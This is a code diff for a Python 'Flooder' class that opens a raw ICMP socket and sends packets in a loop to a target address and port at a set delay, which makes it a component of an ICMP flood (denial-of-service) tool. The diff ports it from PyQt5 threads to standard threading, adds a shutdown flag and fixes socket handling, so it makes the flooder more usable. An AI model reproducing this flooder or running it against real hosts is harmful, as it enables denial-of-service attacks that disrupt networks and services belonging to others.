@@ -1,6 +1,8 @@
-from logging import warning, exception
+from logging import error, warning
 from struct import pack, error as PackException
+from threading import Event, Thread, ThreadError
 from time import time, sleep
+from typing import Any, Dict
 
 from socket import (
     socket,
@@ -11,41 +13,34 @@ from socket import (
     IPPROTO_ICMP
 )
 
-from PyQt5 import QtCore
-from PyQt5.QtCore import QThread
 
-
-class Flooder(QThread):
+class Flooder(Thread):
     """
     This class extends PyQt5.QtCore.QThread class which provides ability to launch
     run( method ) into own thread. This class build ICMP packet (header + body)
     and send to specified address:port.
     """
 
-    address: str
-    """The target ip-address to send ICMP-packets."""
+    def __init__(self, name: str, arguments: Dict[str, Any]):
+        """
+        The main Flooder constructor.
 
-    port_number: int
-    """The target port number to send ICMP-packets."""
+        Args:
+            name (str): The current thread name.
+            arguments (Dict[str, Any]): The dict with target info.
 
-    packet_length: int
-    """The length of ICMP-packet body to send."""
+        """
+        Thread.__init__(self, None)
 
-    sending_frequency: float
-    """The frequency of ICMP-packet sending which provides to set timeout."""
+        self.address = arguments.get('address')
+        self.port_number = arguments.get('port')
+        self.packet_length = arguments.get('length')
+        self.sending_delay = arguments.get('delay')
 
-    finish_signal = QtCore.pyqtSignal()
+        self.name = name
+        self.shutdown_flag = Event()
 
-    def __init__(self, address: str, port_number: int, packet_length: int, sending_frequency: float):
-        QThread.__init__(self, None)
-
-        self.address = address
-        self.port_number = port_number
-        self.packet_length = packet_length
-        self.sending_frequency = sending_frequency
-
-    @staticmethod
-    def _checksum(message) -> int:
+    def _checksum(self, message) -> int:
         """
         This method returns the summary byte length of built ICMP-packet.
 
@@ -89,22 +84,26 @@ class Flooder(QThread):
             to stop all threads whose sending packets.
 
         """
+        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
 
         try:
-            sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
             inet_aton(self.address)
-
-            while True:
+            while not self.shutdown_flag.is_set():
                 packet = self._construct_packet()
                 sock.sendto(packet, (self.address, self.port_number))
-                sleep(self.sending_frequency)
-                sock.close()
+                sleep(self.sending_delay)
 
         except PackException as err:
-            exception(msg=f'Failed while trying pack msg: {err}')
+            error(msg=f'Failed while trying pack msg: {err}')
+            warning(msg=f'The {self.name} thread has not been interrupted!')
 
-        except (KeyboardInterrupt, SystemExit) as err:
-            warning(msg=f'Has been interrupted closing event. Closing all available threads: {err}')
+        except ThreadError as err:
+            error(msg=f'Has been interrupted closing event. Closing all available threads: {err}')
+            warning(msg=f'The {self.name} thread has been stopped!')
+
+        except Exception as err:
+            error(msg=f'Unknown runtime error into {self.name} thread!: {err}')
 
         finally:
-            self.finish_signal.emit()
+            self.shutdown_flag.set()
+            sock.close()
